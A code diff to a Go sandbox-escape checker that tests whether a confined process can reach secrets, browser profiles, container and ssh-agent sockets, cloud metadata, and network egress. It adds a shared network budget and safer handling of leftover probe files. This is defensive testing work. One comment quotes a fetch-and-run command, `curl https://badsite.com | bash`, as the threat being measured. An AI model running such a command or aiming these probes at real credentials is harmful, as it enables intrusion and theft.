@@ -33,6 +33,40 @@ import (
 // rather than refusing them would otherwise hang the whole run.
 const dialTimeout = 4 * time.Second
 
+// networkBudget bounds the network probes together, and sits well inside
+// runTimeout. Each dial is capped at dialTimeout on its own, but the probes run
+// serially and a dozen blackholed ones add up to more than the confined child is
+// allowed: the child was being killed before it printed any JSON, so the
+// strongest egress deny, the one that drops packets instead of refusing them,
+// was scored INDETERMINATE with nothing. Past the budget the probes still to
+// run report ERRORED, and the battery still reports.
+const networkBudget = 20 * time.Second
+
+// probeMarker is the only content the write probes ever create. A file carrying
+// it is recognisable as the probe's own, which is what lets a later run tell a
+// file left by its own crashed predecessor from one someone else put there.
+const probeMarker = "sandboxcheckr probe; safe to delete"
+
+// leftoverMarker reports whether p is a file the probe itself wrote and a killed
+// run left behind: our name and our content, and nothing else. The size is
+// checked first so that a file someone else left under our name cannot make the
+// probe read it all into memory.
+func leftoverMarker(p string) bool {
+	fi, err := os.Stat(p)
+	if err != nil || !fi.Mode().IsRegular() || fi.Size() != int64(len(probeMarker)) {
+		return false
+	}
+	b, err := os.ReadFile(p)
+	return err == nil && string(b) == probeMarker
+}
+
+// dnsLookup is how net.egress.dns asks a name. A variable because the answer
+// that decides the verdict is the awkward one, a resolver that replies with no
+// addresses at all, and the system resolver cannot be made to do that on demand.
+var dnsLookup = func(ctx context.Context, host string) ([]string, error) {
+	return (&net.Resolver{}).LookupHost(ctx, host)
+}
+
 // egressAddr is a literal address, deliberately not a hostname, so that
 // net.egress.tcp measures TCP egress alone and does not fail merely because
 // DNS was unavailable. Port 443 is the one most likely to be permitted by a
@@ -142,6 +176,11 @@ func RunBattery(o Options) []model.ProbeResult {
 	}
 	home := homeView(o.Home, o.HomeID)
 
+	// One budget shared by every network probe, so the serial sum of the dials
+	// cannot outrun the child itself. See networkBudget.
+	ctx, cancel := context.WithTimeout(context.Background(), networkBudget)
+	defer cancel()
+
 	out := []model.ProbeResult{
 		probeWriteAllowed(o.Workdir),
 		probeWriteOutside(home),
@@ -151,25 +190,37 @@ func RunBattery(o Options) []model.ProbeResult {
 		probeWorkdirSecrets(o.Workdir),
 		probeBrowserProfiles(home),
 		probeCredentialStore(home),
-		probeNetTCP(),
-		probeNetDNS(),
-		probeCloudMetadata(),
-		probeContainerSocket(),
-		probeAgentSockets(o.AgentSockets),
-		probeProcExec(),
 	}
+	// The proxy probes come ahead of the internet dials because they are
+	// positive controls: a blackholed egress that spends the shared network
+	// budget must not be able to starve the probe deciding whether this sandbox
+	// can run anything at all. They talk to our own proxy on loopback, so they
+	// cost almost nothing and lose nothing by going first.
 	if o.ExpectProxy != "" {
-		out = append(out, probeProxyControl(o.ExpectProxy))
+		out = append(out, probeProxyControl(ctx, o.ExpectProxy))
 		if o.CanaryHost != "" {
-			out = append(out, probeCanaryDetection(o.ExpectProxy, o.CanaryHost))
+			out = append(out, probeCanaryDetection(ctx, o.ExpectProxy, o.CanaryHost))
 		}
 	}
-	out = append(out, RunExfilBattery(home)...)
+	out = append(out,
+		probeNetTCP(ctx),
+		probeNetDNS(ctx),
+		probeCloudMetadata(ctx),
+		probeContainerSocket(ctx),
+		probeAgentSockets(ctx, o.AgentSockets),
+		probeProcExec(),
+	)
+	out = append(out, RunExfilBattery(ctx, home)...)
 	// brokerProbes are macOS-specific (empty elsewhere): they test egress
 	// performed by a system daemon on the process's behalf, which the socket-level
 	// probes above cannot see. Regression coverage for SBX-001.
-	out = append(out, brokerProbes()...)
-	return append(out, tccProbes(home, o.TCC)...)
+	//
+	// They and the TCC probes run helper binaries rather than opening sockets, so
+	// outOfBudget does not apply to them, but their bounded waits inherit the
+	// same ceiling: the serial sum of every probe in the child has to fit inside
+	// runTimeout, not just the dials.
+	out = append(out, brokerProbes(ctx)...)
+	return append(out, tccProbes(ctx, home, o.TCC)...)
 }
 
 // home is the probe's view of the user's home directory.
@@ -220,10 +271,14 @@ func (h home) isolatedResult(id model.ProbeID) model.ProbeResult {
 // Only connect(2) is attempted — no protocol bytes are sent — because
 // reachability is the whole finding: whatever can connect to an unlocked
 // ssh-agent can ask it to sign, without ever seeing a key file.
-func probeAgentSockets(socks []string) model.ProbeResult {
+func probeAgentSockets(ctx context.Context, socks []string) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeSSHAgent, Want: model.VerdictBlocked}
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
 	var present, reached []string
 	blocked := 0
+	d := net.Dialer{Timeout: dialTimeout}
 	for _, s := range socks {
 		if _, err := os.Stat(s); err != nil {
 			if !errors.Is(err, os.ErrNotExist) {
@@ -235,7 +290,7 @@ func probeAgentSockets(socks []string) model.ProbeResult {
 			continue
 		}
 		present = append(present, s)
-		c, err := net.DialTimeout("unix", s, dialTimeout)
+		c, err := d.DialContext(ctx, "unix", s)
 		if err == nil {
 			_ = c.Close()
 			reached = append(reached, filepath.Base(filepath.Dir(s))+"/"+filepath.Base(s))
@@ -266,9 +321,13 @@ func probeAgentSockets(socks []string) model.ProbeResult {
 // probeProxyControl is the network positive control for a proxied sandbox:
 // the confined process must reach its proxy, or the configuration contains
 // everything and runs nothing — which is how the first proxied profile shipped.
-func probeProxyControl(addr string) model.ProbeResult {
+func probeProxyControl(ctx context.Context, addr string) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeProxyControl, Want: model.VerdictAllowed}
-	c, err := net.DialTimeout("tcp", addr, dialTimeout)
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
+	d := net.Dialer{Timeout: dialTimeout}
+	c, err := d.DialContext(ctx, "tcp", addr)
 	if err == nil {
 		_ = c.Close()
 		r.Verdict = model.VerdictAllowed
@@ -281,16 +340,20 @@ func probeProxyControl(addr string) model.ProbeResult {
 	return r
 }
 
-func probeCanaryDetection(addr, host string) model.ProbeResult {
+func probeCanaryDetection(ctx context.Context, addr, host string) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeCanaryDetection, Want: model.VerdictAllowed, Verdict: model.VerdictErrored,
 		Detail: "canary detection is unverified on this host"}
-	c, err := net.DialTimeout("tcp", addr, dialTimeout)
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
+	d := net.Dialer{Timeout: dialTimeout}
+	c, err := d.DialContext(ctx, "tcp", addr)
 	if err != nil {
 		r.Err = err.Error()
 		return r
 	}
 	defer c.Close()
-	_ = c.SetDeadline(time.Now().Add(dialTimeout))
+	_ = c.SetDeadline(deadline(ctx, dialTimeout))
 	_, err = fmt.Fprintf(c, "CONNECT %s:443 HTTP/1.1\r\nHost: %s:443\r\n\r\n", host, host)
 	if err != nil {
 		r.Err = err.Error()
@@ -316,18 +379,28 @@ func probeBrowserProfiles(h home) model.ProbeResult {
 		return h.isolatedResult(r.ID)
 	}
 	var present, readable []string
+	blocked := 0
 	for _, rel := range browserProfiles[runtime.GOOS] {
 		p := filepath.Join(h.path, rel)
 		if _, err := os.Lstat(p); err != nil {
 			continue
 		}
 		present = append(present, rel)
-		if f, err := os.Open(p); err == nil {
-			_, rerr := f.Readdirnames(1)
-			_ = f.Close()
-			if rerr == nil || errors.Is(rerr, io.EOF) {
-				readable = append(readable, rel)
+		f, err := os.Open(p)
+		if err != nil {
+			if v, _ := classify(err); v == model.VerdictBlocked {
+				blocked++
 			}
+			continue
+		}
+		// Opening a directory can succeed where listing it does not, so list
+		// one entry to prove the contents are reachable.
+		_, rerr := f.Readdirnames(1)
+		_ = f.Close()
+		if rerr == nil || errors.Is(rerr, io.EOF) {
+			readable = append(readable, rel)
+		} else if v, _ := classify(rerr); v == model.VerdictBlocked {
+			blocked++
 		}
 	}
 	switch {
@@ -338,9 +411,15 @@ func probeBrowserProfiles(h home) model.ProbeResult {
 		r.Verdict = model.VerdictAllowed
 		r.Detail = "browser profiles are readable (" + strings.Join(readable, ", ") +
 			"); session cookies in them are bearer credentials for every logged-in site"
-	default:
+	case blocked == len(present):
 		r.Verdict = model.VerdictBlocked
 		r.Detail = "browser profiles are present but not readable"
+	default:
+		// A profile we could not open for a reason other than a permission
+		// refusal (a dangling symlink, an I/O error) tells us nothing about
+		// what the sandbox would have done.
+		r.Verdict = model.VerdictErrored
+		r.Detail = "browser profile access produced inconclusive errors"
 	}
 	return r
 }
@@ -407,6 +486,21 @@ func probePersistence(h home) model.ProbeResult {
 
 	var written, existing []string
 	attempted, blocked := 0, 0
+
+	// A run killed mid-probe leaves its own files behind, and the next run
+	// reads them the wrong way: an existing file answers the O_APPEND open and
+	// is reported as a write the sandbox never permitted. Clear our own names
+	// first, and only ever a file carrying the probe's own marker, never one a
+	// real installer or the user put there.
+	for _, rel := range paths {
+		if !strings.Contains(filepath.Base(rel), "sandboxcheckr-probe") {
+			continue
+		}
+		if p := filepath.Join(home, rel); leftoverMarker(p) {
+			_ = os.Remove(p)
+		}
+	}
+
 	for _, rel := range paths {
 		p := filepath.Join(home, rel)
 		// Never truncate a real dotfile. Only a path that does not already
@@ -433,6 +527,7 @@ func probePersistence(h home) model.ProbeResult {
 			}
 			continue
 		}
+		_, _ = f.WriteString(probeMarker)
 		_ = f.Close()
 		_ = os.Remove(p)
 		written = append(written, rel)
@@ -444,15 +539,19 @@ func probePersistence(h home) model.ProbeResult {
 		r.Detail = "can create or modify startup/shell files (" +
 			strings.Join(append(written, existing...), ", ") +
 			"); untrusted code could persist across reboots"
-	case blocked > 0:
+	case blocked > 0 && blocked == attempted:
+		// BLOCKED is worth its weight, so it takes every attempt saying so. One
+		// EACCES among a set of missing parent directories is not the sandbox
+		// refusing, it is one coincidence in a home directory that has no
+		// systemd user unit directory.
 		r.Verdict = model.VerdictBlocked
 		r.Detail = "cannot create or modify startup or shell configuration files"
 	default:
-		// Every attempt failed for a reason other than a permission refusal
-		// (a missing parent directory, typically). That is not evidence the
-		// sandbox would have stopped us.
+		// Attempts failed for a reason other than a permission refusal (a
+		// missing parent directory, typically), or only some of them were
+		// refused. Neither is evidence the sandbox would have stopped the rest.
 		r.Verdict = model.VerdictErrored
-		r.Detail = fmt.Sprintf("persistence probe was inconclusive (%d attempts, none refused by permission)", attempted)
+		r.Detail = fmt.Sprintf("persistence probe was inconclusive (%d attempts, %d refused by permission)", attempted, blocked)
 	}
 	return r
 }
@@ -517,9 +616,13 @@ func probeCredentialStore(h home) model.ProbeResult {
 // endpoint is unauthenticated, so any code that can open a socket to it can
 // usually obtain credentials for the instance's role. A sandbox that blocks
 // general egress but permits link-local traffic has left this wide open.
-func probeCloudMetadata() model.ProbeResult {
+func probeCloudMetadata(ctx context.Context) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeCloudMetadata, Want: model.VerdictBlocked}
-	conn, err := net.DialTimeout("tcp", metadataAddr, dialTimeout)
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
+	d := net.Dialer{Timeout: dialTimeout}
+	conn, err := d.DialContext(ctx, "tcp", metadataAddr)
 	if err == nil {
 		_ = conn.Close()
 		r.Verdict = model.VerdictAllowed
@@ -537,19 +640,31 @@ func probeCloudMetadata() model.ProbeResult {
 // probeContainerSocket tests access to a container control socket, which is
 // usually equivalent to root on the host: anything that can talk to it can
 // start a privileged container mounting the host filesystem.
-func probeContainerSocket() model.ProbeResult {
+func probeContainerSocket(ctx context.Context) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeContainerSocket, Want: model.VerdictBlocked}
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
 
 	var present, opened []string
+	blocked := 0
+	d := net.Dialer{Timeout: dialTimeout}
 	for _, p := range containerSockets {
 		if _, err := os.Lstat(p); err != nil {
 			continue
 		}
 		present = append(present, p)
-		conn, err := net.DialTimeout("unix", p, dialTimeout)
+		conn, err := d.DialContext(ctx, "unix", p)
 		if err == nil {
 			_ = conn.Close()
 			opened = append(opened, p)
+			continue
+		}
+		// Only a refusal is containment. A dial that timed out, or failed
+		// because the daemon behind the socket never answers, says nothing
+		// about whether the sandbox would have let us in.
+		if v, _, _ := classifyNet(err); v == model.VerdictBlocked {
+			blocked++
 		}
 	}
 
@@ -561,9 +676,12 @@ func probeContainerSocket() model.ProbeResult {
 		r.Verdict = model.VerdictAllowed
 		r.Detail = "container control socket is reachable (" + strings.Join(opened, ", ") +
 			"); this is generally equivalent to root on the host"
-	default:
+	case blocked == len(present):
 		r.Verdict = model.VerdictBlocked
-		r.Detail = "container control sockets are present but not reachable"
+		r.Detail = "container control sockets are present but each one refused the connection"
+	default:
+		r.Verdict = model.VerdictErrored
+		r.Detail = "container control socket access produced inconclusive errors"
 	}
 	return r
 }
@@ -573,6 +691,30 @@ func WriteResults(w io.Writer, results []model.ProbeResult) error {
 	enc := json.NewEncoder(w)
 	enc.SetIndent("", "  ")
 	return enc.Encode(results)
+}
+
+// outOfBudget is the answer for a network probe that never got to start
+// because the battery's shared budget had already gone. Not trying is not
+// evidence that the sandbox would have refused, so this is ERRORED, and the
+// child still lives long enough to print the results it does have.
+func outOfBudget(ctx context.Context, r model.ProbeResult) (model.ProbeResult, bool) {
+	if ctx.Err() == nil {
+		return r, false
+	}
+	r.Verdict = model.VerdictErrored
+	r.Err = ctx.Err().Error()
+	r.Detail = "the battery network budget was exhausted before this probe ran; not counted as contained"
+	return r, true
+}
+
+// deadline is when one socket operation must stop: its own timeout, or the
+// battery's shared network budget, whichever comes first.
+func deadline(ctx context.Context, d time.Duration) time.Time {
+	until := time.Now().Add(d)
+	if budget, ok := ctx.Deadline(); ok && budget.Before(until) {
+		return budget
+	}
+	return until
 }
 
 // classify turns an operation's error into a verdict. The distinction between
@@ -670,13 +812,30 @@ func probeWriteOutside(h home) model.ProbeResult {
 	// O_EXCL: never overwrite a file that happens to have this name.
 	f, err := os.OpenFile(p, os.O_CREATE|os.O_EXCL|os.O_WRONLY, 0o600)
 	if err == nil {
-		_, _ = f.WriteString("sandboxcheckr probe; safe to delete")
+		_, _ = f.WriteString(probeMarker)
 		_ = f.Close()
+	} else if errors.Is(err, os.ErrExist) && leftoverMarker(p) {
+		// A run killed before its cleanup left a file here, and every run after
+		// it would meet EEXIST and report the write refused by a home directory
+		// that has never been protected. Our own marker in that file is proof a
+		// previous write succeeded, which is the finding the leftover is hiding.
+		r.Verdict = model.VerdictAllowed
+		r.Detail = "a marker left by an earlier run is still in the home directory, so writes " +
+			"outside the workdir are not prevented"
+		// Take the evidence with us: the next run then tests the sandbox rather
+		// than reading the same leftover, and the probe leaves nothing behind on
+		// a machine whose sandbox failed to stop it.
+		_ = os.Remove(p)
+		return r
 	}
 	r.Verdict, r.Errno = classify(err)
 	if err != nil {
 		r.Err = err.Error()
-		r.Detail = "writes outside the workdir are refused"
+		if r.Verdict == model.VerdictBlocked {
+			r.Detail = "writes outside the workdir are refused"
+		} else {
+			r.Detail = "the probe could not test writes outside the workdir; not counted as contained"
+		}
 		return r
 	}
 	// The write succeeded, so we made a mess. Clean it up: the probe must not
@@ -742,9 +901,13 @@ func probeReadSecrets(h home) model.ProbeResult {
 
 // probeNetTCP tests raw TCP egress to a literal IP. This is the probe that
 // decides whether `curl https://badsite.com | bash` remains possible.
-func probeNetTCP() model.ProbeResult {
+func probeNetTCP(ctx context.Context) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeNetEgressTCP, Want: model.VerdictBlocked}
-	conn, err := net.DialTimeout("tcp", egressAddr, dialTimeout)
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
+	d := net.Dialer{Timeout: dialTimeout}
+	conn, err := d.DialContext(ctx, "tcp", egressAddr)
 	if err == nil {
 		_ = conn.Close()
 		r.Verdict = model.VerdictAllowed
@@ -761,13 +924,26 @@ func probeNetTCP() model.ProbeResult {
 // probeNetDNS tests name resolution separately from TCP. DNS alone is a viable
 // exfiltration channel, and sandboxes frequently permit it unintentionally by
 // allowing access to the local resolver.
-func probeNetDNS() model.ProbeResult {
+func probeNetDNS(ctx context.Context) model.ProbeResult {
 	r := model.ProbeResult{ID: model.ProbeNetEgressDNS, Want: model.VerdictBlocked}
-	res := &net.Resolver{}
-	ctx, cancel := context.WithTimeout(context.Background(), dialTimeout)
+	if got, done := outOfBudget(ctx, r); done {
+		return got
+	}
+	ctx, cancel := context.WithTimeout(ctx, dialTimeout)
 	defer cancel()
-	addrs, err := res.LookupHost(ctx, egressHost)
-	if err == nil && len(addrs) > 0 {
+	addrs, err := dnsLookup(ctx, egressHost)
+	if err == nil && len(addrs) == 0 {
+		// NODATA: the resolver answered, it just had nothing to say. That is a
+		// working resolver, so it is not containment, and no address came back,
+		// so it is not exposure either. Handing it to classifyNet with a nil
+		// error would have reported it as a successful lookup, which the report
+		// then renders as a failed egress deny.
+		r.Verdict = model.VerdictErrored
+		r.Detail = "the resolver answered for " + egressHost + " with no addresses; neither " +
+			"containment nor exposure"
+		return r
+	}
+	if err == nil {
 		r.Verdict = model.VerdictAllowed
 		r.Detail = "DNS resolution succeeded; data can be exfiltrated via lookups even without TCP egress"
 		return r
